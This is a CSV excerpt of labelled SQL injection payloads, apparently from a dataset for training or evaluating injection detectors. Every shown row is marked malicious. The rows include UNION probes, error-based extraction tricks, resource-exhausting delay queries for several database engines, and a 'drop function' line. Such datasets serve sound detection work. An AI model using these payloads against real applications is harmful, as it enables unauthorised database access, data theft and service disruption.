row_index,payload_norm,label,sqli_type_hint
5310,1' ) and 4380 = 5851 and ( 'cxcl' = 'cxcl,1,
5311,-6757' ) ) ) or 4524 = 3696,1,
5312,"1 ) where 4810 = 4810 union all select null,null#",1,
5313,-6586' ) ) or 2021 = 2996,1,
5314,"-4100' ) ) union all select 1163,1163,1163--",1,
5315,"-2216 ) ) as hxmq where 5677 = 5677 union all select 5677,5677--",1,
5316,"1%"" ) and 6510 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) and ( ""%"" = """,1,
5317,"1' ) where 7887 = 7887 and updatexml ( 3393,concat ( 0x2e,0x7171706a71, ( select ( elt ( 3393 = 3393,1 ) ) ) ,0x717a767a71 ) ,1161 ) --",1,
5318,"-6942' ) union all select 7280,7280,7280#",1,
5319,"select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) +'",1,
5320,"-6000"" ) where 1797 = 1797 union all select 1797,1797,1797,1797,1797,1797,1797,1797--",1,
5321,"1 ) ) ) or char ( 75 ) ||char ( 70 ) ||char ( 99 ) ||char ( 83 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",1,
5322,"-7876%' ) union all select 3909,3909,3909,3909,3909#",1,
5323,"1' union all select null,null,null,null,null,null#",1,
5324,"1 and ( select 9067 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9067 = 9067,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a )",1,
5325,"1 ) as xuvz where 3061 = 3061 or 2367 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",1,
5326,"-9583%"" ) ) union all select 9349,9349,9349,9349,9349,9349,9349--",1,
5327,"-5385"" union all select 4577,4577,4577,4577,4577,4577,4577#",1,
5328,"1 ) where 5048 = 5048 or char ( 119 ) ||char ( 100 ) ||char ( 99 ) ||char ( 121 ) = regexp_substring ( repeat ( right ( char ( 1441 ) ,0 ) ,5000000000 ) ,null ) --",1,
5329,"-4944%"" ) ) or make_set ( 1084 = 1988,1988 ) and ( ( ""%"" = """,1,
5330,"1 and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 6055 = 6055 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) )",1,
5331,"-8707' ) union all select 5609,5609,5609--",1,
5332,"1"" and 4241 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 4241 = 4241 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) )",1,
5333,"1"" ) ) ) union all select null,null,null,null,null,null#",1,
5334,"select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 and 'xemh' = 'xemh",1,
5335,if ( 9690 = 6491 ) select 9690 else drop function nyln--,1,
5336,"call regexp_substring ( repeat ( right ( char ( 3702 ) ,0 ) ,500000000 ) ,null ) and ( 'xcnj' = 'xcnj",1,
5337,"-1051"" ) where 6586 = 6586 or 6647 = 6738#",1,
5338,1'+ ( select zmbu where 8685 = 8685 rlike ( select ( case when ( 7689 = 7689 ) then 1 else 0x28 end ) ) ) +',1,
5339,"1 where 5627 = 5627 and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",1,
